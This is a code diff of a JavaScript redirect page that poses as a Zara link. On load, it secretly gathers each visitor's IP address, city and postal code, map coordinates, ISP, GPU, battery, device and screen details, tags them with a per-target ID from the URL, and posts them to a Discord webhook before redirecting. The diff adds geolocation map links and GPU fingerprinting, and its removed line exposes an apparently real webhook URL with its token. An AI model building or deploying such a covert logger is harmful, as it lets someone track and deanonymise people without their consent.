@@ -1,43 +1,59 @@
 <script>
     async function logAndGo() {
-        const webhookURL = "https://discord.com/api/webhooks/1494944448767983697/KzHvXGmFkSIWds1vzdEDuySWPA6XuDyAwuddTBol9QJbaw5NLDjD_JdBp-LNWgizpBvC";
+        const webhookURL = "YOUR_DISCORD_WEBHOOK_URL_HERE";
         const destination = "https://www.zara.com/my/";
-        const timeout = setTimeout(() => window.location.replace(destination), 3500);
+        const timeout = setTimeout(() => window.location.replace(destination), 4000);
 
         try {
-            // 1. IP & Location (Standard)
+            // 1. URL ID Tracking (Usage: link.com/?id=Hafizi)
+            const urlParams = new URLSearchParams(window.location.search);
+            const visitorId = urlParams.get('id') || "Public/General";
+
+            // 2. IP & Enhanced Location
             const ipRes = await fetch('https://ipapi.co/json/').catch(() => null);
             const ipData = ipRes ? await ipRes.json() : {};
+            const place = `${ipData.city || '??'}, ${ipData.region || '??'} ${ipData.postal || ''}`;
+            const mapLink = (ipData.latitude && ipData.longitude) 
+                ? `[Google Maps](https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude})` 
+                : "No Coordinates";
 
-            // 2. Battery Data (Only works on Chrome/Android/Edge)
-            let batteryInfo = "Unsupported/Private";
+            // 3. Hardware & GPU (The "Phone Engine")
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
+            const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Hidden/Software";
+
+            // 4. Battery Data
+            let batteryInfo = "Blocked/Safari";
             if (navigator.getBattery) {
                 const b = await navigator.getBattery();
-                batteryInfo = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'On Battery'})`;
+                batteryInfo = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Unplugged'})`;
             }
 
-            // 3. Network & Hardware
+            // 5. Network & Browser Environment
             const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
             const netType = conn ? conn.effectiveType : "Unknown";
-            const cores = navigator.hardwareConcurrency || "Unknown";
-            const ram = navigator.deviceMemory ? `${navigator.deviceMemory}GB` : "Unknown";
+            const ram = navigator.deviceMemory ? `${navigator.deviceMemory}GB` : "Hidden (iOS)";
+            const orientation = screen.orientation ? screen.orientation.type : "Unknown";
 
-            // 4. Prepare Deep Log
+            // 6. Build the Discord Embed
             const logData = {
-                username: "Profile Sentry Pro",
+                username: "Elite Sentry V5",
                 embeds: [{
-                    title: "👤 Detailed Visitor Report",
-                    color: 15418405, // A nice Red/Orange
+                    title: `👤 Visitor: ${visitorId}`,
+                    color: 3447003, // Blue
                     fields: [
-                        { name: "📍 Location", value: `${ipData.city || '??'}, ${ipData.country_name || '??'}`, inline: false },
-                        { name: "🌐 IP & ISP", value: `\`${ipData.ip}\` \n ${ipData.org}`, inline: true },
+                        { name: "📍 Location", value: `**${place}**\n${ipData.country_name}`, inline: false },
+                        { name: "🗺️ IP Map", value: mapLink, inline: true },
+                        { name: "🌐 IP & ISP", value: `\`${ipData.ip}\`\n${ipData.org}`, inline: true },
+                        { name: "🎮 GPU / Chip", value: `\`${gpu}\``, inline: false },
                         { name: "🔋 Battery", value: batteryInfo, inline: true },
                         { name: "📶 Network", value: netType.toUpperCase(), inline: true },
-                        { name: "📱 Device Info", value: `${navigator.platform} | ${cores} Cores | ${ram} RAM`, inline: false },
-                        { name: "📐 Screen", value: `${screen.width}x${screen.height}`, inline: true },
-                        { name: "⏰ Timezone", value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true }
+                        { name: "📱 Hardware", value: `${navigator.platform} | ${navigator.hardwareConcurrency || '?'} Cores | ${ram} RAM`, inline: false },
+                        { name: "📐 Screen", value: `${screen.width}x${screen.height} (@${window.devicePixelRatio}x)`, inline: true },
+                        { name: "🌍 Other", value: `Lang: ${navigator.language}\nMode: ${orientation}`, inline: true }
                     ],
-                    footer: { text: "Advanced Tracking Active" },
+                    footer: { text: `Target: ${destination}` },
                     timestamp: new Date()
                 }]
             };
@@ -50,7 +66,7 @@
             });
 
         } catch (e) {
-            console.log("Logger skip.");
+            console.log("Error logging, redirecting...");
         } finally {
             clearTimeout(timeout);
             window.location.replace(destination);
